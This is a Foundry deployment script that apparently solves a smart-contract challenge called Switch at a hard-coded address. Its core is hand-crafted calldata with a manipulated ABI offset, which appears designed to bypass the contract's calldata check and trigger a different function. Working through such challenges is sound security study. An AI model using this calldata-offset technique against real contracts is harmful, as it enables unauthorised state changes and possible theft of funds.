// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Switch} from "../src/Switch.sol";

contract SwitchScript is Script {
    address constant DEPLOYED_CONTRACT_ADDRESS = 0xec0b0E9cFF2FD479DDA5875ebfdD01B61adeA395;

    event Log(bytes);
    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        
        Switch target = Switch(DEPLOYED_CONTRACT_ADDRESS);

        // emit Log(abi.encodeWithSelector(bytes4(keccak256("flipSwitch(bytes)")), encodedData));

        bytes memory ex = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000044000000000000000000000000000000000000000000000000000000000000000420606e15000000000000000000000000000000000000000000000000000000000000000476227e12";

        address(target).call(ex);

        vm.stopBroadcast();
    }
}